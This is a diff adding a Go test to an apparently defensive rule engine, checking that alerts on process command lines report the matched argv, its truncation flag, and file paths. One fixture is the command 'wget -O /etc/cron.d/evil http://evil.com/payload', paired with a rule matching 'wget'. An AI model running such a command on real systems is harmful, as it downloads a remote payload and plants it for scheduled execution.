@@ -2131,3 +2131,110 @@ func TestWave60fShippedRuleSplit200(t *testing.T) {
 			"the container-case subgroup is an OR over container.id and k8s.pod")
 	})
 }
+
+// TestProcArgsReachesAlertDetails pins 6.0j/№209: a rule that conditions on
+// proc.args must put the matched command line INTO the alert, so a control
+// reading /api/v1/alerts can show which argv it matched instead of asserting
+// a bare count. Before this, Alert.Event was json:"-" and Details carried only
+// file.path / dns.qname — a zero from a proc.args rule was indistinguishable
+// from a proc.args the collector had blanked out (commMatchesArgv0).
+func TestProcArgsReachesAlertDetails(t *testing.T) {
+	execRule := Rule{
+		ID:        "pa_details_exec",
+		Name:      "exec from system bin",
+		EventType: types.EventSyscall,
+		Condition: RuleCondition{
+			Field:  "proc.args",
+			Op:     OpPrefix,
+			Values: []string{"/usr/local/bin/"},
+		},
+		Severity: types.SeverityWarning,
+		Action:   ActionAlert,
+	}
+
+	t.Run("syscall alert carries the matched argv", func(t *testing.T) {
+		engine := NewRuleEngine([]Rule{execRule})
+		alerts := engine.Evaluate(types.Event{
+			Type:     types.EventSyscall,
+			ProcArgs: "/usr/local/bin/dnw2-seed/dnw2-b46b1514",
+			Syscall:  &types.SyscallEvent{Nr: 59},
+		})
+		require.Len(t, alerts, 1)
+		assert.Equal(t, "/usr/local/bin/dnw2-seed/dnw2-b46b1514", alerts[0].Details["proc.args"])
+		assert.NotContains(t, alerts[0].Details, "proc.args_truncated",
+			"the truncation flag is omitted when the cmdline was not truncated")
+	})
+
+	t.Run("truncation is visible on the alert", func(t *testing.T) {
+		engine := NewRuleEngine([]Rule{execRule})
+		alerts := engine.Evaluate(types.Event{
+			Type:              types.EventSyscall,
+			ProcArgs:          "/usr/local/bin/dnw2-novel/dnw2-b46b1514 --flag",
+			ProcArgsTruncated: true,
+			Syscall:           &types.SyscallEvent{Nr: 59},
+		})
+		require.Len(t, alerts, 1)
+		assert.Equal(t, true, alerts[0].Details["proc.args_truncated"])
+	})
+
+	t.Run("EvaluateInto agrees with Evaluate", func(t *testing.T) {
+		engine := NewRuleEngine([]Rule{execRule})
+		var got []types.Alert
+		engine.EvaluateInto(types.Event{
+			Type:     types.EventSyscall,
+			ProcArgs: "/usr/local/bin/dnw2-seed/dnw2-b46b1514",
+			Syscall:  &types.SyscallEvent{Nr: 59},
+		}, func(a types.Alert) { got = append(got, a) })
+		require.Len(t, got, 1)
+		assert.Equal(t, "/usr/local/bin/dnw2-seed/dnw2-b46b1514", got[0].Details["proc.args"])
+	})
+
+	t.Run("file path still wins for file-access alerts", func(t *testing.T) {
+		rule := Rule{
+			ID:        "pa_details_file",
+			Name:      "wget writing to etc",
+			EventType: types.EventFileAccess,
+			Condition: RuleCondition{
+				Field:  "proc.args",
+				Op:     OpContains,
+				Values: []string{"wget"},
+			},
+			Severity: types.SeverityWarning,
+			Action:   ActionAlert,
+		}
+		engine := NewRuleEngine([]Rule{rule})
+		e := types.Event{
+			Type:     types.EventFileAccess,
+			ProcArgs: "wget -O /etc/cron.d/evil http://evil.com/payload",
+			File:     &types.FileEvent{Op: 2},
+		}
+		copy(e.File.Filename[:], "/etc/cron.d/evil")
+		alerts := engine.Evaluate(e)
+		require.Len(t, alerts, 1)
+		assert.Equal(t, "/etc/cron.d/evil", alerts[0].Details["file.path"],
+			"file.path must not be displaced by proc.args — 5.8e.1/находка №18")
+		assert.NotContains(t, alerts[0].Details, "proc.args")
+	})
+
+	t.Run("no details when the event carries no argv", func(t *testing.T) {
+		rule := Rule{
+			ID:        "pa_details_nr",
+			Name:      "raw syscall",
+			EventType: types.EventSyscall,
+			Condition: RuleCondition{
+				Field:  "syscall.nr",
+				Op:     OpEquals,
+				Values: []string{"101"},
+			},
+			Severity: types.SeverityWarning,
+			Action:   ActionAlert,
+		}
+		engine := NewRuleEngine([]Rule{rule})
+		alerts := engine.Evaluate(types.Event{
+			Type:    types.EventSyscall,
+			Syscall: &types.SyscallEvent{Nr: 101},
+		})
+		require.Len(t, alerts, 1)
+		assert.Nil(t, alerts[0].Details, "details,omitempty must stay omitted")
+	})
+}
